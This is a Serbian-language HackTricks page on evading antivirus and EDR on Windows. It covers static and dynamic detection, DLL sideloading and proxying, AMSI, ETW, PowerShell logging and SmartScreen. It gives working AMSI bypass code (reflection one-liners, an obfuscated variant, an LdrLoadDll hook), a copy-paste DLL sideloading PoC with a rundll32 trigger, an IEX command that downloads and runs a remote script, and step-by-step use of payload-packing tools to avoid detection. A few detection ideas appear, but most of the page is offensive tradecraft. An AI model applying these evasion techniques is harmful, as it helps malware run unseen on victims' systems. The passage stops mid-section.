# Antivirus (AV) Zaobilaženje

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavi Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat koji zaustavlja Windows Defender tako što lažira drugi AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Trenutno, AVs koriste različite metode za proveru da li je fajl maliciozan ili ne: static detection, dynamic analysis, i za naprednije EDRs — behavioural analysis.

### **Static detection**

Static detection se postiže flagovanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i ekstrakcijom informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da upotreba poznatih javnih alata može lakše dovesti do otkrivanja, jer su verovatno već bili analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ovakav tip detekcije:

- **Encryption**

Ako enkriptujete binarni fajl, AV neće moći da detektuje vaš program, ali će vam trebati neki loader da dekriptira i pokrene program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti nekoliko stringova u vašem binarnom fajlu ili skripti da biste prošli pored AV-a, ali to može biti vremenski zahtevno u zavisnosti od onoga što pokušavate da obfuskujete.

- **Custom tooling**

Ako razvijate svoje alate, neće postojati poznati loši potpisni obrasci, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru protiv Windows Defender static detection je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On praktično deli fajl na više segmenata i zatim tera Defender da skenira svaki od njih pojedinačno, na taj način vam može tačno reći koji su stringovi ili bajtovi u vašem binarnom fajlu označeni.

Toplo preporučujem da pogledate ovu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion.

### **Dynamic analysis**

Dynamic analysis je kada AV pokreće vaš binarni fajl u sandbox-u i posmatra malicioznu aktivnost (npr. pokušaj dekriptovanja i čitanja browser lozinki, pravljenje minidump-a na LSASS, itd.). Ovaj deo može biti malo komplikovaniji za rad, ali evo nekoliko stvari koje možete uraditi da izbegnete sandbokse.

- **Sleep before execution** Zavisno od implementacije, može biti odličan način za zaobilaženje AV-ove dynamic analysis. AV-ovi imaju vrlo kratko vreme za skeniranje fajlova kako ne bi ometali korisnikov rad, pa korišćenje dugih sleep-ova može poremetiti analizu binarnih fajlova. Problem je što mnoge AV sandbokse mogu jednostavno preskočiti sleep zavisno od implementacije.
- **Checking machine's resources** Obično sandboksi imaju vrlo malo resursa (npr. < 2GB RAM), inače bi mogli usporiti korisnikov računar. Ovde možete biti i vrlo kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora — nije sve implementirano u sandbox-u.
- **Machine-specific checks** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara da vidite da li se poklapa sa onim koji ste naveli; ako se ne poklapa, vaš program može izaći.

Ispostavilo se da je Microsoft Defender-ov Sandbox computername HAL9TH, tako da možete proveriti ime računara u svom malveru pre detonacije — ako se ime poklapa sa HAL9TH, to znači da ste unutra u defender-ovom sandbox-u, pa možete naterati vaš program da izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još neki odlični saveti od [@mgeeky](https://twitter.com/mariuszbit) za rad protiv Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli u ovom postu, public tools će na kraju biti detected, tako da biste trebali da postavite sebi pitanje:

Na primer, ako želite da dump-ujete LSASS, da li zaista morate koristiti mimikatz? Ili biste mogli koristiti neki drugi projekat koji je manje poznat i takođe dump-uje LSASS?

Pravi odgovor je verovatno ovo drugo. Uzmimo mimikatz za primer — verovatno je jedan od, ako ne i najviše flagovanih komada alata od strane AV-ova i EDR-ova; iako je projekat super, on je noćna mora kada pokušavate da ga zaobiđete u AV-ima, pa jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada modifikujete svoje payload-e radi evazije, pobrinite se da isključite automatic sample submission u defender-u, i molim vas ozbiljno, **NE UPLOADUJTE NA VIRUSTOTAL** ako vam je cilj dugoročna evazija. Ako želite da proverite da li vaš payload detektuje određeni AV, instalirajte ga na VM, pokušajte da isključite automatic sample submission i testirajte tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritizujte korišćenje DLLs za evaziju** — iz mog iskustva, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, tako da je to veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (ako vaš payload ima način da se pokrene kao DLL naravno).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima detection rate 4/26 na antiscan.me, dok EXE payload ima 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možete koristiti sa DLL fajlovima da budete mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order koji loader koristi tako što pozicionira i aplikaciju žrtve i maliciozni payload(e) jedno pored drugog.

Možete proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite DLL Hijackable/Sideloadable programe**, ova tehnika je prilično stealthy ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje da učita neće pokrenuti vaš payload, jer program očekuje određene funkcije u tom DLL-u; da bismo to rešili, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi iz proxy (i zlonamernog) DLL-a ka originalnom DLL-u, čime se očuva funkcionalnost programa i omogućava upravljanje izvršenjem vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/).

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Oba naša shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju 0/26 Detection rate na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Toplo preporučujem da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste detaljnije naučili više o onome što smo ovde diskutovali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE modules mogu da eksportuju funkcije koje su zapravo "forwarderi": umesto da pokazuju na kod, entry za export sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivač razreši export, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, on se dobavlja iz zaštićenog KnownDLLs namespace-a (npr., ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalan redosled pretrage DLL-ova, koji uključuje direktorijum modula koji obavlja forward resolution.

Ovo omogućava indirektnu sideloading primitivu: pronađite potpisani DLL koji eksportuje funkciju forwardovanu ka imenu modula koji nije KnownDLL, zatim smestite taj potpisani DLL u isti direktorijum sa zlonamernim DLL-om pod nazivom tačno kao forwarded target module. Kada se pozove forwarded export, loader razreši forward i učita vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer primećen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se rešava preko normalnog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u direktorijum u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite maliciozni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršenje koda; ne morate implementirati prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokreni prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- Dok rešava `KeyIsoSetAuditingInterface`, loader sledi forward ka `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što se `DllMain` već izvršio

Hunting tips:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete enumerisati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar forwardera za Windows 11 kako biste tražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Ideje za detekciju/odbranu:
- Pratite LOLBins (npr. rundll32.exe) koji učitavaju signed DLLs iz non-system putanja, a zatim iz tog direktorijuma učitavaju non-KnownDLLs sa istim base name
- Upozorite na lance procesa/modula kao što su: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` pod user-writable putanjama
- Sprovodite politike integriteta koda (WDAC/AppLocker) i zabranite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na neprimetan način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što funkcioniše danas može biti detektovano sutra, zato se nikad ne oslanjaj samo na jedan alat; kad je moguće, pokušaj da lančano kombinuješ više evasion tehnika.

## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AVs su mogli da skeniraju samo **fajlove na disku**, pa ako bi nekako izvršio payload direktno **u memoriji**, AV nije imao dovoljno vidljivosti da to zaustavi.

AMSI je integrisan u sledeće Windows komponente:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ona omogućava antivirus rešenjima da inspektuju ponašanje skripti izlažući sadržaj skripti u obliku koji nije enkriptovan niti obfuskovan.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će izazvati sledeći alert na Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primeti kako dodaje prefiks `amsi:` i zatim putanju do izvršnog fajla iz kojeg je skripta pokrenuta — u ovom slučaju, powershell.exe

Nismo ispustili nijedan fajl na disk, ali smo i dalje otkriveni u memoriji zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za izvršenje u memoriji. Zato se preporučuje korišćenje nižih verzija .NET-a (npr. 4.7.2 ili niže) za in-memory izvršenje ako želiš da izbegneš AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi na osnovu statičkih detekcija, modifikovanje skripti koje pokušavaš da učitaš može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima kapacitet da deobfuskuje skripte čak i ako imaju više slojeva, tako da obfuskacija može biti loša opcija zavisno od načina na koji je urađena. To onemogućava jednostavno zaobilaženje. Ipak, ponekad sve što treba da uradiš jeste da promeniš par imena promenljivih i biće dovoljno, tako da zavisi koliko je nešto već označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se radi kao neprivilegovani korisnik. Zbog ove greške u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Forcing an Error**

Prinuditi neuspeh inicijalizacije AMSI-ja (amsiInitFailed) rezultira time da se za trenutni proces neće pokrenuti nijedno skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio signature da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Trebao je samo jedan red powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Ovaj red je, naravno, bio detektovan od strane samog AMSI, tako da je potrebna određena modifikacija da bi se koristila ova tehnika.

Evo modifikovanog AMSI bypass-a koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno kada ovaj post bude objavljen, pa ne biste trebali objavljivati nikakav kod ako planirate ostati neprimećeni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje korisnički unesenog sadržaja) i prepisivanje iste instrukcijama koje vraćaju kod E_INVALIDARG; na taj način, rezultat stvarnog skeniranja će biti 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI pomoću powershell, pogledajte [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što je `amsi.dll` učitan u trenutni proces. Robustan, nezavisan od jezika bypass je postavljanje user‑mode hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i za taj proces se ne vrše skeniranja.

Skica implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi na PowerShell, WScript/CScript i prilagođenim loaderima (bilo šta što bi inače učitalo AMSI).
- Koristite uz prosleđivanje skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke artefakte komandne linije.
- Primećeno da se koristi od strane loadera pokretanih kroz LOLBins (npr., `regsvr32` koji poziva `DllRegisterServer`).

Ovaj alat [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) takođe generiše skriptu za zaobilaženje AMSI.

**Uklonite detektovani potpis**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite detektovani AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa tražeći AMSI potpis i zatim ga prepisuje NOP instrukcijama, efektivno uklanjajući ga iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja vam omogućava da beležite sve PowerShell komande koje se izvršavaju na sistemu. Ovo je korisno za audit i rešavanje problema, ali takođe može predstavljati problem za napadače koji žele da izbegnu detekciju.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) za ovu namenu.
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI neće biti učitan, pa možete pokretati svoje skripte bez AMSI skeniranja. Ovo možete uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete powershell bez odbrana (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na enkriptovanje podataka, što će povećati entropiju binarnog fajla i olakšati AV-ima i EDR-ovima da ga detektuju. Budite oprezni sa tim i možda primenjujte enkripciju samo na specifične sekcije koda koje su osetljive ili koje treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove) često se susrećete sa više slojeva zaštite koji blokiraju dekompilere i sandbokse. Radni tok ispod pouzdano **vraća skoro-originalni IL** koji se potom može dekompilovati u C# u alatima poput dnSpy ili ILSpy.

1.  Anti-tampering removal – ConfuserEx enkriptuje svako *method body* i dekriptuje ga unutar *module* static konstruktora (`<Module>.cctor`). Ovo takođe patch-uje PE checksum tako da bilo koja modifikacija može srušiti binarni fajl. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, oporavite XOR ključeve i prepišete čist assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izgradnji sopstvenog unpacker-a.

2.  Symbol / control-flow recovery – prosledite *clean* fajl u **de4dot-cex** (ConfuserEx-aware fork de4dot-a).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – izaberite ConfuserEx 2 profil  
• de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i imena promenljivih i dekriptovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim wrapperima (aka *proxy calls*) da dodatno onemogući dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je poput `Convert.FromBase64String` ili `AES.Create()` umesto nečitljivih wrapper funkcija (`Class8.smethod_10`, …).

4.  Manual clean-up – pokrenite rezultujući binarni fajl u dnSpy, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da locirate *pravi* payload. Često malware čuva payload kao TLV-enkodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Gornji lanac vraća tok izvršavanja **bez** potrebe za pokretanjem zlonamernog uzorka – korisno kada radite na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi custom atribut nazvan `ConfusedByAttribute` koji se može koristiti kao IOC za automatsku trižu uzoraka.

#### Jednolinijski
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuskator za C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog paketa koji omogućava veću bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako koristiti `C++11/14` jezik da se prilikom kompajliranja generiše obfuscated code bez upotrebe eksternog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operations generisanih C++ template metaprogramming framework‑om, što će otežati život osobi koja želi da crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može obfuskirati različite PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike podržane od strane LLVM koji koristi ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly koda transformišući regularne instrukcije u ROP chains, narušavajući našu prirodnu percepciju normalnog control flow‑a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može konvertovati postojeće EXE/DLL u shellcode i zatim ih učitati

## SmartScreen & MoTW

Možda ste videli ovaj ekran pri preuzimanju nekih izvršnih fajlova sa interneta i njihovom pokretanju.

Microsoft Defender SmartScreen je bezbednosni mehanizam dizajniran da zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputacije, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen i upozoriti i sprečiti krajnjeg korisnika da izvrši fajl (iako fajl i dalje može biti izvršen klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani sa **trusted** signing certificate **won't trigger SmartScreen**.

Veoma efikasan način da sprečite da vaši payload‑ovi dobiju Mark of The Web je da ih spakujete u neki kontejner poput ISO‑a. Do toga dolazi zato što Mark-of-the-Web (MOTW) **cannot** biti primenjen na **non NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload‑ove u izlazne kontejnere da bi izbegao Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windowsu koji omogućava aplikacijama i sistemskim komponentama da **log events**. Međutim, može se koristiti i od strane sigurnosnih proizvoda za praćenje i otkrivanje zlonamernih aktivnosti.

Slično kao što se AMSI onemogućava (bypassa), moguće je i da funkcija **`EtwEventWrite`** u korisničkom procesu odmah vrati kontrolu bez beleženja bilo kakvih događaja. Ovo se postiže patchovanjem funkcije u memoriji da odmah vrati, efektivno onemogućavajući ETW logovanje za taj proces.

Više informacija možete naći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory je poznato već neko vreme i i dalje je odličan način za pokretanje vaših post-exploitation alata bez da vas AV otkrije.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, biće potrebno samo da se pozabavimo patchovanjem AMSI za ceo proces.

Većina C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assemblies direktno u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Podrazumeva **pokretanje novog žrtvovanog procesa**, ubacivanje vašeg post-exploitation zlonamernog koda u taj proces, izvršavanje koda i kad se završi, ubijanje tog procesa. Ovo ima i prednosti i mane. Prednost Fork and Run metode je što se izvršavanje dešava **izvan** našeg Beacon implant process. To znači da ako nešto u našoj post-exploitation akciji pođe po zlu ili bude otkriveno, postoji **mnogo veća šansa** da naš **implant preživi.** Mana je što imate **veću šansu** da vas otkriju **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

